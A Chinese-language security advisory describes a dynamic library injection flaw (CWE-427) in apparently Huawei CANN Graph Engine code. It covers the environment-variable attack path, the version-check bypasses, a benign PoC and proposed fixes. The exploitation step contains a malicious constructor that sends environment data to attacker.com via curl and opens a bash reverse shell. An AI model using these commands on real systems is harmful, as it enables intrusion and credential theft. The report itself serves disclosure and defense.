# VULN-SEC-DYN-003：动态库注入漏洞

## 漏洞概述

### 基本信息
- **漏洞ID**: VULN-SEC-DYN-003
- **漏洞类型**: Dynamic Library Injection (动态库注入)
- **CWE分类**: CWE-427 - Uncontrolled Search Path Element
- **严重性**: Critical
- **置信度**: 80%
- **影响文件**: 
  - `base/registry/op_impl_space_registry_v2_impl.cc:79-129`
  - `base/registry/opp_so_manager.cc:111-124`
  - `base/common/plugin/plugin_manager.cc:156-179, 380-396`

### 技术原理

该漏洞属于 **CWE-427: Uncontrolled Search Path Element**，即"不受控制的搜索路径元素"漏洞。攻击者可以通过控制环境变量 `ASCEND_OPP_PATH` 或 `ASCEND_CUSTOM_OPP_PATH`，将恶意动态库路径注入到算子加载流程中。

核心问题在于：
1. **环境变量直接控制库路径**：系统直接从环境变量获取算子库路径，未进行白名单验证
2. **版本验证可被绕过**：`opp_latest` 关键字或缺失版本文件可绕过版本兼容性检查
3. **无签名验证**：`mmDlopen()` 直接加载库文件，无任何完整性或真实性验证
4. **ValidateSo 未在关键路径调用**：文件大小检查仅在部分流程生效

---

## 攻击向量分析

### 入口点

#### 1. 环境变量入口
```cpp
// plugin_manager.cc:159-161
MM_SYS_GET_ENV(MM_ENV_ASCEND_OPP_PATH, path_env);
if ((path_env != nullptr) && (strlen(path_env) > 0U)) {
    opp_path = path_env;  // 直接使用环境变量值
}
```

```cpp
// plugin_manager.cc:253-258
MM_SYS_GET_ENV(MM_ENV_ASCEND_CUSTOM_OPP_PATH, custom_opp_path_env);
if (custom_opp_path_env == nullptr) {
    return;
}
custom_op_lib_path_ = std::string(custom_opp_path_env);
```

**攻击者控制点**：
- 设置 `ASCEND_OPP_PATH=/malicious/path/`
- 设置 `ASCEND_CUSTOM_OPP_PATH=/malicious/custom_lib/`

#### 2. 库路径传播链
```
plugin_manager.cc:159  MM_SYS_GET_ENV(ASCEND_OPP_PATH) 
→ plugin_manager.cc:161  opp_path = path_env 
→ plugin_manager.cc:608  GetOpsProtoPath() calls GetOppPath() 
→ opp_so_manager.cc:37   GetOpsProtoPath 
→ opp_so_manager.cc:176  LoadOpsProtoSo() 
→ opp_so_manager.cc:62   GetOppSoList() 
→ opp_so_manager.cc:111  LoadSoAndInitDefault() 
→ op_impl_space_registry_v2_impl.cc:79  AddSoToRegistry() 
→ op_impl_space_registry_v2_impl.cc:91  mmDlopen(so_path)
```

### 缓解措施绕过分析

#### 1. IsVendorVersionValid 绕过

**代码位置**: `plugin_manager.cc:380-396`

```cpp
bool PluginManager::IsVendorVersionValid(const std::string &vendor_path) {
  // opp_kernel包支持独立升级，不进行版本号校验
  if (vendor_path.find(kOppLatest) != std::string::npos) {
    GELOGW("Will not verify version for [%s] as the opp kernel is independent upgrade.", 
           vendor_path.c_str());
    return true;  // 直接返回 true，跳过验证
  }

  // 获取opp包版本号
  std::string opp_version;
  std::string compiler_version;
  GetOppAndCompilerVersion(vendor_path, opp_version, compiler_version);
  if (opp_version.empty() && compiler_version.empty()) {
    GELOGW("[NotVerification] Will not verify version as the opp version and compiler version are not set");
    return true;  // 版本信息缺失时也返回 true
  }
  return IsVendorVersionValid(opp_version, compiler_version);
}
```

**绕过方式**：
- **方式A**: 使用包含 `opp_latest` 的路径名
  ```
  ASCEND_OPP_PATH=/attacker/path/opp_latest/
  ```
  
- **方式B**: 不提供 `version.info` 文件
  - 如果路径下不存在 `version.info` 或文件内容无效
  - `opp_version` 和 `compiler_version` 都为空
  - 函数返回 `true`，跳过验证

**单元测试验证** (plugin_manager_unittest.cc:1110-1112):
```cpp
TEST_F(UtestPluginManager, test_plugin_manager_IsVendorVersionValid_OppKernel) {
  EXPECT_EQ(PluginManager::IsVendorVersionValid("/usr/local/Ascend/opp_latest/"), true);
}
```

#### 2. mmRealPath 绕过

**代码位置**: 多处调用

```cpp
// mmRealPath 仅检查路径是否存在，不验证库真实性
mmRealPath(path.c_str(), &(resolved_path[0U]), MMPA_MAX_PATH);
```

**局限性**：
- 仅验证路径是否存在、是否可访问
- 不验证文件来源、签名或完整性
- 攻击者创建恶意文件即可通过此检查

#### 3. ValidateSo 绕过

**代码位置**: `plugin_manager.cc:775-802`

```cpp
ge::Status PluginManager::ValidateSo(const std::string &file_path,
                                     const int64_t size_of_loaded_so, int64_t &file_size) const {
  struct stat stat_buf;
  if (stat(file_path.c_str(), &stat_buf) != 0) {
    return ge::FAILED;
  }
  
  file_size = stat_buf.st_size;
  if (stat_buf.st_size > kMaxSizeOfSo) {  // 仅检查大小 (800M限制)
    return ge::FAILED;
  }
  
  if ((size_of_loaded_so + file_size) > kMaxSizeOfLoadedSo) {  // 总大小限制 (1000M)
    return ge::FAILED;
  }
  return ge::SUCCESS;
}
```

**关键发现**：`ValidateSo` 仅在以下流程中被调用：
- `PluginManager::LoadSo()` (plugin_manager.cc:708)
- `PluginManager::Load()` (plugin_manager.cc:872)

**但在漏洞路径中未被调用**：
- `OppSoManager::LoadSoAndInitDefault()` 直接传递 so_list 给 `AddSoToRegistry`
- `AddSoToRegistry()` 直接调用 `mmDlopen()`，无 ValidateSo 调用

#### 4. 无签名验证

**代码位置**: `op_impl_space_registry_v2_impl.cc:91-93`

```cpp
void *const handle = mmDlopen(
    so_path,  // 直接使用路径，无签名验证
    static_cast<int32_t>(static_cast<uint32_t>(MMPA_RTLD_NOW) | 
                         static_cast<uint32_t>(MMPA_RTLD_GLOBAL)));
```

**缺失的安全措施**：
- 无数字签名验证
- 无哈希校验
- 无白名单机制
- 无代码完整性检查

---

## 详细利用步骤

### 攻击场景假设
攻击者已在目标系统获得有限权限（如普通用户），希望通过动态库注入提升权限或执行恶意代码。

### 步骤 1: 准备恶意动态库

```bash
# 创建恶意算子库
mkdir -p /tmp/malicious_opp/built-in/op_impl/ai_core/tbe/op_tiling/lib/linux/x86_64/

# 编译恶意库 (示例：窃取环境变量、建立反向连接)
cat > malicious_op.cpp << 'EOF'
#include <cstdlib>
#include <iostream>
#include <unistd.h>

// 库加载时自动执行的初始化函数
__attribute__((constructor))
void malicious_init() {
    // 执行恶意代码
    system("curl http://attacker.com/exfil?data=$(env | base64)");
    
    // 或建立反向 shell
    system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
}
EOF

g++ -shared -fPIC -o /tmp/malicious_opp/built-in/op_impl/ai_core/tbe/op_tiling/lib/linux/x86_64/libmalicious.so malicious_op.cpp
```

### 步骤 2: 绕过版本验证

**方法 A**: 使用 `opp_latest` 关键字
```bash
# 设置环境变量，路径包含 opp_latest
export ASCEND_OPP_PATH=/tmp/malicious_opp_latest/
mkdir -p /tmp/malicious_opp_latest/built-in/op_impl/ai_core/tbe/op_tiling/lib/linux/x86_64/
cp libmalicious.so /tmp/malicious_opp_latest/built-in/op_impl/ai_core/tbe/op_tiling/lib/linux/x86_64/
```

**方法 B**: 不提供版本文件
```bash
# 不创建 version.info 文件
# GetOppAndCompilerVersion 返回空版本，IsVendorVersionValid 返回 true
export ASCEND_OPP_PATH=/tmp/malicious_opp/
# 确保目录结构正确但不包含 version.info
```

### 步骤 3: 触发库加载

当 CANN 应用程序启动或执行模型推理时：
```bash
# 启动使用 CANN 的应用程序
python3 inference_script.py  # 或任何使用 GE/acl 的程序

# 库加载流程触发：
# 1. PluginManager::GetOppPath() 获取 ASCEND_OPP_PATH
# 2. OppSoManager::LoadOppPackage() 开始加载
# 3. LoadOpsProtoSo() 扫描恶意目录
# 4. GetOppSoList() 收集 libmalicious.so
# 5. LoadSoAndInitDefault() 传递给 AddSoToRegistry
# 6. AddSoToRegistry() 调用 mmDlopen("/tmp/malicious_opp/.../libmalicious.so")
# 7. 恶意库的 __attribute__((constructor)) 函数自动执行
```

### 步骤 4: 恶意代码执行

恶意库加载后：
- `constructor` 函数在 `dlopen` 时自动执行
- 可窃取敏感数据（API密钥、认证信息）
- 可建立反向连接获取持久化访问
- 可劫持算子执行流程注入错误结果

---

## PoC 示例

### 概念性 PoC

```bash
#!/bin/bash
# VULN-SEC-DYN-003 PoC - 动态库注入演示
# 注意：此 PoC 仅用于安全研究和漏洞验证

# 1. 创建恶意库目录结构
MALICIOUS_PATH="/tmp/poc_opp_latest"
mkdir -p "$MALICIOUS_PATH/built-in/op_impl/ai_core/tbe/op_tiling/lib/linux/x86_64/"

# 2. 创建简单的测试库 (仅打印日志，不执行恶意操作)
cat > /tmp/poc_lib.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void poc_init() {
    printf("[PoC] Library loaded via uncontrolled path!\n");
    printf("[PoC] Current path injection successful.\n");
}
EOF

gcc -shared -fPIC -o "$MALICIOUS_PATH/built-in/op_impl/ai_core/tbe/op_tiling/lib/linux/x86_64/libpoc.so" /tmp/poc_lib.c

# 3. 设置环境变量绕过验证
export ASCEND_OPP_PATH="$MALICIOUS_PATH/"

# 4. 触发验证 - 可通过单元测试或实际应用程序
# 验证路径被系统接受：
echo "PoC setup complete. Path set to: $ASCEND_OPP_PATH"
echo "Expected result: mmDlopen will load library without signature verification"

# 清理
rm -f /tmp/poc_lib.c
```

### 验证代码分析

```cpp
// 验证 opp_latest 绕过的单元测试已存在于代码库
// tests/ut/base/testcase/plugin_manager_unittest.cc:1110-1112
TEST_F(UtestPluginManager, test_plugin_manager_IsVendorVersionValid_OppKernel) {
  EXPECT_EQ(PluginManager::IsVendorVersionValid("/usr/local/Ascend/opp_latest/"), true);
}
// 此测试证明：包含 opp_latest 的路径直接返回 true，跳过验证
```

---

## 影响评估

### 攻击后果

| 影响类型 | 严重程度 | 描述 |
|---------|---------|------|
| **权限提升** | Critical | 恶意库可执行任意代码，可能获取更高权限 |
| **数据窃取** | High | 可窃取环境变量中的敏感信息（API密钥、认证凭证） |
| **代码执行** | Critical | 完全的代码执行能力，包括反向连接、持久化 |
| **算子劫持** | High | 可修改算子行为，注入错误结果影响模型准确性 |
| **供应链攻击** | High | 可能作为供应链攻击入口点 |

### 影响范围

**受影响组件**：
- 所有使用 CANN GE (Graph Engine) 的应用程序
- 模型推理服务
- 算子编译流程
- 自定义算子开发环境

**受影响部署场景**：
- 共享服务器环境（多个用户可设置不同环境变量）
- 容化部署（环境变量通过配置注入）
- CI/CD 流程（构建环境可能被利用）

### CVSS 评估建议

**CVSS 3.1 评估**:
- Attack Vector (AV): Local (环境变量需本地设置)
- Attack Complexity (AC): Low (简单路径构造即可绕过)
- Privileges Required (PR): Low (需普通用户权限设置环境变量)
- User Interaction (UI): None
- Scope (S): Changed (可影响其他进程)
- CIA Impact: High/High/High

**建议评分**: **8.8 (High)** - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

---

## 修复建议

### 1. 签名验证机制

**推荐方案**: 为所有动态库实现数字签名验证

```cpp
// 建议新增签名验证函数
bool VerifySoSignature(const std::string &so_path) {
    // 读取签名文件 (如 .sig 或内嵌签名)
    std::string sig_path = so_path + ".sig";
    
    // 使用公钥验证签名
    // 仅华为官方签名或授权签名有效
    if (!VerifyDigitalSignature(so_path, sig_path, trusted_public_key)) {
        GELOGE("Signature verification failed for %s", so_path.c_str());
        return false;
    }
    return true;
}

// 在 AddSoToRegistry 中添加验证
ge::graphStatus OpImplSpaceRegistryImpl::AddSoToRegistry(const OppSoDesc &so_desc) {
    for (const auto &so_path : so_desc.GetSoPaths()) {
        // 新增：签名验证
        if (!VerifySoSignature(std::string(so_path.GetString()))) {
            GELOGE("Rejected unsigned library: %s", so_path.GetString());
            continue;  // 拒绝未签名库
        }
        
        void *const handle = mmDlopen(so_path.GetString(), ...);
        // ...
    }
}
```

### 2. 白名单机制

```cpp
// 定义可信库白名单
const std::set<std::string> kTrustedSoWhitelist = {
    "libop_proto.so",
    "libop_impl.so",
    "libcust_opapi.so",
    // ... 其他授权库
};

bool IsSoInWhitelist(const std::string &so_name) {
    // 仅允许白名单内的库被加载
    return kTrustedSoWhitelist.find(so_name) != kTrustedSoWhitelist.end();
}
```

### 3. 移除 opp_latest 绕过逻辑

```cpp
// plugin_manager.cc:380-396 修改建议
bool PluginManager::IsVendorVersionValid(const std::string &vendor_path) {
  // 移除 opp_latest 自动绕过逻辑
  // 即使是 opp_kernel 包，也应验证签名或使用白名单
  
  std::string opp_version;
  std::string compiler_version;
  GetOppAndCompilerVersion(vendor_path, opp_version, compiler_version);
  
  // 强制要求版本信息
  if (opp_version.empty() && compiler_version.empty()) {
    GELOGE("[Security] Rejected path without version info: %s", vendor_path.c_str());
    return false;  // 改为拒绝而非跳过
  }
  return IsVendorVersionValid(opp_version, compiler_version);
}
```

### 4. 环境变量验证

```cpp
// 在 GetOppPath 中添加路径验证
ge::Status PluginManager::GetOppPath(std::string &opp_path) {
    const ge::char_t *path_env = nullptr;
    MM_SYS_GET_ENV(MM_ENV_ASCEND_OPP_PATH, path_env);
    
    if (path_env != nullptr) {
        // 新增：验证路径是否在可信位置
        std::string canonical_env = RealPath(path_env);
        if (!IsTrustedOppPath(canonical_env)) {
            GELOGE("Rejected untrusted OPP path: %s", path_env);
            return ge::FAILED;
        }
        opp_path = canonical_env;
    }
    // ...
}

// 定义可信路径
bool IsTrustedOppPath(const std::string &path) {
    const std::vector<std::string> trusted_roots = {
        "/usr/local/Ascend/",
        "/opt/ascend/",
        // 安装时配置的可信路径
    };
    for (const auto &root : trusted_roots) {
        if (path.find(root) == 0) {
            return true;
        }
    }
    return false;
}
```

### 5. 在关键路径添加 ValidateSo

```cpp
// opp_so_manager.cc:111-124 修改建议
void OppSoManager::LoadSoAndInitDefault(const std::vector<AscendString> &so_list, ...) const {
    int64_t size_of_loaded_so = 0;
    for (const auto &so_path_ascend : so_list) {
        auto so_path = so_path_ascend.GetString();
        
        // 新增：调用 ValidateSo
        int64_t file_size = 0;
        if (ValidateSo(std::string(so_path), size_of_loaded_so, file_size) != ge::SUCCESS) {
            GELOGW("Rejected library after validation: %s", so_path);
            continue;
        }
        
        // 新增：签名验证
        if (!VerifySoSignature(std::string(so_path))) {
            continue;
        }
        
        // 加载库
        gert::OppSoDesc opp_so_desc(so_list, ...);
        // ...
    }
}
```

---

## 附录

### 相关文件位置

| 文件 | 路径 | 关键行号 |
|-----|------|---------|
| op_impl_space_registry_v2_impl.cc | base/registry/ | 79-159 (AddSoToRegistry) |
| opp_so_manager.cc | base/registry/ | 111-124, 168-222 |
| plugin_manager.cc | base/common/plugin/ | 156-179, 380-396, 775-802 |
| plugin_manager.h | inc/common/plugin/ | 111-113 |
| plugin_manager_unittest.cc | tests/ut/base/testcase/ | 1110-1112 |

### 环境变量定义

| 变量名 | 作用 | 安全风险 |
|-------|------|---------|
| `ASCEND_OPP_PATH` | 算子包根目录 | 高 - 可注入任意库路径 |
| `ASCEND_CUSTOM_OPP_PATH` | 自定义算子路径 | 高 - 可注入自定义算子库 |
| `ASCEND_HOME_PATH` | Ascend 安装目录 | 中 - 用于 opp_latest 路径构造 |

### 参考资料

- CWE-427: Uncontrolled Search Path Element: https://cwe.mitre.org/data/definitions/427.html
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- Secure Library Loading Best Practices: https://wiki.sei.cmu.edu/confluence/display/c/SEC06-C.+Handle+library+loading+securely

---

## 结论

**漏洞确认状态**: 真实漏洞 (非误报)

**根本原因**:
1. 环境变量直接控制动态库加载路径
2. `opp_latest` 关键字可绕过版本验证
3. 版本信息缺失时不强制拒绝
4. 加载路径中无签名验证、无白名单、无完整性校验
5. `ValidateSo` 仅检查文件大小，未在关键路径调用

**建议优先级**:
- P0 (立即修复): 实现签名验证机制
- P0 (立即修复): 移除 opp_latest 自动绕过逻辑
- P1 (高优先级): 添加可信路径白名单
- P1 (高优先级): 在 AddSoToRegistry 调用 ValidateSo
- P2 (中优先级): 增强版本验证严格性

---

*报告生成时间: 2026-04-22*
*分析工具: OpenCode Vulnerability Scanner*
